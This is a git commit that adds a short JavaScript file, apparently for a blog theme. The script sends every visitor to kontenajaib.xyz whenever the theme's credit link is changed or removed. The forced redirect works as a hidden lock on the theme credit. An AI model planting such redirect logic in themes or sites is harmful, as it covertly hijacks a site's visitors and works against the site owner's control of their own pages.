c3ac32dc44f095b979a502ddf7f5530f9872869a
yudhaagrn <50839637+yudhaagrn@users.noreply.github.com>
2019-05-20 23:03:56 +0700

    Create badanthemekontenmagz.js

---
+++ badanthemekontenmagz.js
@@ -0,0 +1,6 @@
+<script type='text/javascript'>
+//<![CDATA[
+$(document).ready(function () { if ($("#change,.change").attr("href") != "https://www.kontenajaib.xyz/") {
+        window.location.href = "https://www.kontenajaib.xyz/"; }});
+//]]>
+</script>
